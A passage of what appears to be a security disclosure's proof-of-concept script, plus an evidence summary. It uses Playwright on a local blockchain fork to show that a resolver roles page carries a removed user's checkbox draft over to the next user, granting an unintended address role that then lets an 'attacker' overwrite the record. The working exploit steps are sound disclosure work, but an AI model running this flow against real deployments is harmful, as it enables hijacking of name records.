        (ACCOUNT_C, A_BITMAP),
        (ACCOUNT_D, B_BITMAP),
    ):
        seed_transactions[account] = chain.send(
            OWNER,
            RESOLVER,
            encode_call(
                "grantRootRoles(uint256,address)", ["uint256", "address"], [bitmap, account]
            ),
        )
    if [chain.roles(account) for account in ACCOUNTS] != [A_BITMAP, B_BITMAP, A_BITMAP, B_BITMAP]:
        raise RuntimeError("failed to seed the four supported root-role holders")

    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(headless=True)
        page = browser.new_page(viewport={"width": 1440, "height": 1100})
        console_lines: list[str] = []
        page.on("console", lambda message: console_lines.append(f"[{message.type}] {message.text}"))
        page.on("pageerror", lambda error: console_lines.append(f"[pageerror] {error}"))
        page.route(re.compile(r"https?://.*"), local_only)
        page.goto(
            f"{args.app}/resolver/{RESOLVER}/roles",
            wait_until="domcontentloaded",
            timeout=120_000,
        )
        page.get_by_role("heading", name="Roles", exact=True).wait_for(timeout=120_000)

        def row(account: str):
            return page.locator("tr").filter(
                has_text=re.compile(
                    re.escape(account[:6]) + r".*" + re.escape(account[-4:]), re.I
                )
            ).first

        def checkbox(role: str):
            return page.locator(f"#{role}-manager")

        def start_wallet_transaction() -> None:
            page.get_by_role("button", name="Start", exact=True).wait_for(timeout=30_000)
            page.get_by_role("button", name="Start", exact=True).click()
            page.get_by_role("button", name="Open wallet", exact=True).wait_for(timeout=30_000)
            page.get_by_role("button", name="Open wallet", exact=True).click()

        def wait_roles(account: str, bitmap: int) -> None:
            deadline = time.time() + 90
            while chain.roles(account) != bitmap:
                if time.time() > deadline:
                    raise RuntimeError(f"timed out waiting for {account} roles {bitmap}")
                time.sleep(0.25)

        for account in ACCOUNTS:
            row(account).wait_for(timeout=120_000)
        page.screenshot(path=str(evidence / "002-four-role-holders-before-s9v2g6.png"), full_page=True)

        row(ACCOUNT_A).get_by_role("button", name="Edit user roles").click()
        checkbox("ROLE_SET_ADDR").wait_for(timeout=30_000)
        if not checkbox("ROLE_SET_ADDR").is_checked() or not checkbox("ROLE_SET_TEXT").is_checked():
            raise RuntimeError("A's initial draft was not populated")
        page.screenshot(path=str(evidence / "002-a-draft-before-remove-s9v2g6.png"), full_page=True)
        page.get_by_role("button", name="Remove user").click()
        page.get_by_role("dialog").get_by_role("button", name="Remove", exact=True).click()
        start_wallet_transaction()
        wait_roles(ACCOUNT_A, 0)
        page.get_by_role("button", name="Done", exact=True).wait_for(timeout=120_000)
        page.screenshot(path=str(evidence / "002-a-remove-success-s9v2g6.png"), full_page=True)
        page.get_by_role("button", name="Done", exact=True).click()
        row(ACCOUNT_A).wait_for(state="detached", timeout=120_000)
        row(ACCOUNT_B).wait_for(timeout=120_000)
        page.screenshot(path=str(evidence / "002-b-shifted-without-remount-s9v2g6.png"), full_page=True)

        row(ACCOUNT_B).get_by_role("button", name="Edit user roles").click()
        checkbox("ROLE_SET_ADDR").wait_for(timeout=30_000)
        stale_addr_checked = checkbox("ROLE_SET_ADDR").is_checked()
        text_checked = checkbox("ROLE_SET_TEXT").is_checked()
        contenthash_checked_before = checkbox("ROLE_SET_CONTENTHASH").is_checked()
        if not stale_addr_checked or not text_checked or contenthash_checked_before:
            raise RuntimeError("B did not inherit A's index-bound address draft")
        if chain.roles(ACCOUNT_B) != B_BITMAP:
            raise RuntimeError("B already had the stale address role on chain")
        page.screenshot(path=str(evidence / "002-b-inherits-a-address-draft-s9v2g6.png"), full_page=True)

        checkbox("ROLE_SET_CONTENTHASH").click()
        page.get_by_role("button", name="Save", exact=True).click()
        page.get_by_role("button", name="Start", exact=True).wait_for(timeout=30_000)
        page.screenshot(path=str(evidence / "002-b-save-review-omits-role-detail-s9v2g6.png"), full_page=True)
        start_wallet_transaction()
        wait_roles(ACCOUNT_B, B_BITMAP | UNINTENDED_GRANT)
        page.get_by_role("button", name="Done", exact=True).wait_for(timeout=120_000)
        page.screenshot(path=str(evidence / "002-b-unintended-grant-success-s9v2g6.png"), full_page=True)
        page.get_by_role("button", name="Done", exact=True).click()

        attacker_one = bytes.fromhex("1111111111111111111111111111111111111111")
        attacker_write = chain.send(
            ACCOUNT_B,
            RESOLVER,
            encode_call(
                "setAddr(bytes32,uint256,bytes)",
                ["bytes32", "uint256", "bytes"],
                [NODE, COIN_TYPE_ETH, attacker_one],
            ),
        )
        if chain.addr() != attacker_one:
            raise RuntimeError("unintended root address role did not authorize B")
        b_roles_after_exploit = chain.roles(ACCOUNT_B)

        exact_cleanup = chain.send(
            OWNER,
            RESOLVER,
            encode_call(
                "revokeRootRoles(uint256,address)",
                ["uint256", "address"],
                [UNINTENDED_GRANT, ACCOUNT_B],
            ),
        )
        attacker_two = bytes.fromhex("2222222222222222222222222222222222222222")
        rejected_write = chain.send(
            ACCOUNT_B,
            RESOLVER,
            encode_call(
                "setAddr(bytes32,uint256,bytes)",
                ["bytes32", "uint256", "bytes"],
                [NODE, COIN_TYPE_ETH, attacker_two],
            ),
            expected_status=0,
        )
        if chain.roles(ACCOUNT_B) != B_BITMAP or chain.addr() != attacker_one:
            raise RuntimeError("B cleanup negative control failed")

        # Fresh component state control: delete C, then reload before opening shifted D.
        page.reload(wait_until="domcontentloaded")
        page.get_by_role("heading", name="Roles", exact=True).wait_for(timeout=120_000)
        row(ACCOUNT_C).wait_for(timeout=120_000)
        row(ACCOUNT_C).get_by_role("button", name="Edit user roles").click()
        checkbox("ROLE_SET_ADDR").wait_for(timeout=30_000)
        if not checkbox("ROLE_SET_ADDR").is_checked():
            raise RuntimeError("C control draft was not populated")
        page.get_by_role("button", name="Remove user").click()
        page.get_by_role("dialog").get_by_role("button", name="Remove", exact=True).click()
        start_wallet_transaction()
        wait_roles(ACCOUNT_C, 0)
        page.get_by_role("button", name="Done", exact=True).wait_for(timeout=120_000)
        page.get_by_role("button", name="Done", exact=True).click()
        row(ACCOUNT_C).wait_for(state="detached", timeout=120_000)

        page.reload(wait_until="domcontentloaded")
        page.get_by_role("heading", name="Roles", exact=True).wait_for(timeout=120_000)
        row(ACCOUNT_D).wait_for(timeout=120_000)
        row(ACCOUNT_D).get_by_role("button", name="Edit user roles").click()
        checkbox("ROLE_SET_TEXT").wait_for(timeout=30_000)
        fresh_addr_checked = checkbox("ROLE_SET_ADDR").is_checked()
        fresh_text_checked = checkbox("ROLE_SET_TEXT").is_checked()
        save_disabled = page.get_by_role("button", name="Save", exact=True).is_disabled()
        if fresh_addr_checked or not fresh_text_checked or not save_disabled:
            raise RuntimeError("fresh remount did not clear C's predecessor draft")
        page.screenshot(path=str(evidence / "002-fresh-remount-negative-control-s9v2g6.png"), full_page=True)
        (evidence / "browser-console-s9v2g6.log").write_text("\n".join(console_lines) + "\n")
        browser.close()

    trace = [json.loads(line) for line in Path(args.trace).read_text().splitlines() if line]
    requests = [entry for entry in trace if entry.get("phase") == "request"]
    if len(requests) != 3:
        raise RuntimeError(f"expected A revoke, B grant, C revoke; found {len(requests)}")

    expected = [
        ("revokeRootRoles(uint256,address)", A_BITMAP, ACCOUNT_A),
        ("grantRootRoles(uint256,address)", UNINTENDED_GRANT, ACCOUNT_B),
        ("revokeRootRoles(uint256,address)", A_BITMAP, ACCOUNT_C),
    ]
    portal_transactions = []
    for request, (signature, expected_bitmap, expected_account) in zip(requests, expected):
        if request.get("selector") != "0x" + selector(signature).hex():
            raise RuntimeError(f"unexpected Portal selector for {signature}")
        decoded_bitmap, decoded_account = decode(
            ["uint256", "address"], bytes.fromhex(request["data"][10:])
        )
        if decoded_bitmap != expected_bitmap or to_checksum_address(decoded_account) != expected_account:
            raise RuntimeError(f"unexpected decoded payload for {signature}")
        responses = [
            entry
            for entry in trace
            if entry.get("phase") == "response"
            and entry.get("traceSequence") == request.get("traceSequence")
        ]
        if len(responses) != 1 or not responses[0].get("transactionHash"):
            raise RuntimeError("missing Portal transaction response")
        receipt = chain.w3.eth.get_transaction_receipt(responses[0]["transactionHash"])
        if receipt.status != 1:
            raise RuntimeError("Portal transaction did not succeed")
        portal_transactions.append(
            {
                "function": signature.split("(")[0],
                "decodedBitmap": str(decoded_bitmap),
                "decodedAccount": to_checksum_address(decoded_account),
                "hash": responses[0]["transactionHash"],
                "status": receipt.status,
                "blockNumber": receipt.blockNumber,
                "gasUsed": receipt.gasUsed,
            }
        )

    result = {
        "schema": "p7c4u9-002-browser-fork-lifecycle-s9v2g6-v1",
        "fixedFork": {
            "chainId": chain.w3.eth.chain_id,
            "blockNumber": BLOCK_NUMBER,
            "blockHash": BLOCK_HASH,
            "writes": "local-anvil-only",
        },
        "sourceRevision": "cda79acaad59711b943fc68207ebb3f1d0ff8596",
        "resolver": RESOLVER,
        "name": NAME,
        "seed": {
            "A": {"account": ACCOUNT_A, "bitmap": str(A_BITMAP), "transaction": seed_transactions[ACCOUNT_A]},
            "B": {"account": ACCOUNT_B, "bitmap": str(B_BITMAP), "transaction": seed_transactions[ACCOUNT_B]},
            "C": {"account": ACCOUNT_C, "bitmap": str(A_BITMAP), "transaction": seed_transactions[ACCOUNT_C]},
            "D": {"account": ACCOUNT_D, "bitmap": str(B_BITMAP), "transaction": seed_transactions[ACCOUNT_D]},
        },
        "portalLifecycle": {
            "samePageAfterARefetch": True,
            "bLiveOnChainBeforeEditBitmap": str(B_BITMAP),
            "bDraftInheritedAddress": stale_addr_checked,
            "victimSelectedOnlyContentHash": not contenthash_checked_before,
            "decodedTransactions": portal_transactions,
            "bGrantBitmap": str(UNINTENDED_GRANT),
            "bGrantContainsUnselectedAddress": True,
        },
        "terminalState": {
            "bRolesAfterPortalGrant": str(b_roles_after_exploit),
            "expectedTextAddressContentHash": str(B_BITMAP | UNINTENDED_GRANT),
            "bSetAddrAfterUnintendedGrant": "SUCCESS",
            "attackerAddress": "0x" + attacker_one.hex(),
            "attackerWriteTransaction": attacker_write,
        },
        "authorizationNegativeControl": {
            "exactCleanupTransaction": exact_cleanup,
            "bRolesAfterCleanup": str(chain.roles(ACCOUNT_B)),
            "bWriteAfterCleanupStatus": rejected_write["status"],
            "recordUnchanged": chain.addr() == attacker_one,
        },
        "freshComponentNegativeControl": {
            "cRemoved": chain.roles(ACCOUNT_C) == 0,
            "pageReloadedBeforeOpeningShiftedD": True,
            "dAddressUnchecked": not fresh_addr_checked,
            "dTextChecked": fresh_text_checked,
            "saveDisabled": save_disabled,
        },
        "verdict": "BREAKS_RUNTIME_IN_REAL_SUCCESS_REFETCH_LIFECYCLE",
    }
    (evidence / "002-runtime-verdict-s9v2g6.json").write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
```

### Captured evidence

The verdict JSON (`002-runtime-verdict-s9v2g6.json`), the RPC trace (`002-rpc-trace-s9v2g6.jsonl`), the indexer derivation log (`002-indexer-trace-s9v2g6.jsonl`), the browser console log, eight UI screenshots (four-holder seed state, A's draft before removal, A remove success, B shifted without remount, B inheriting A's Address draft, the Save review modal that omits the role delta, the unintended-grant success, and the fresh-remount negative control), and the SHA-256 manifest `SHA256SUMS.s9v2g6.txt` are included in the linked secret Gist alongside this same code, so every value quoted above can be inspected directly.
